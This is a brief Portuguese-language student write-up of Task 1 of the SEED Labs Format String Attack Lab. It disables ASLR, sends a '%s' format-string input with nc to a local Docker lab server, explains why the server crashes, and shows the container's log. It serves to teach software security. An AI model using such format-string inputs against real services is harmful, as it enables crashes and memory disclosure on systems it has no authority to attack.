# SEED Labs - Format String Attack Lab

## Task 1

Primeiro, fazemos o setup do ambiente.

```
[11/07/22]seed@VM:~/.../Labsetup$ sudo sysctl -w kernel.randomize_va_space=0

[11/07/22]seed@VM:~/.../server-code$ make
[11/07/22]seed@VM:~/.../server-code$ make install
[11/07/22]seed@VM:~/.../server-code$ docker-compose build
[11/07/22]seed@VM:~/.../server-code$ docker-compose up
```  

Vamos escrever no standard input a string "%s". 
```
[11/07/22]seed@VM:~/.../Labsetup$ echo %s | nc 10.9.0.5 9090
```  

A função `myprintf` vai chamar o equivalente a:
```c
 printf("%s");
 ```
Fazer esta chamada, sem passar os argumentos necessários à função `printf`, faz com que o programa trate um endereço na stack como um endereço onde uma string deveria estar guardada. O mais provável é que não seja possível ler uma string, levando o programa a terminar indevidamente.


- Output do container:
```
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd0f0
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 3 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd018
server-10.9.0.5 | The target variable's value (before): 0x11223344
```

Não é imprimida nenhuma mensagem de retorno, pelo que presupomos que o programa terminou sem retornar devidamente.

# CTF
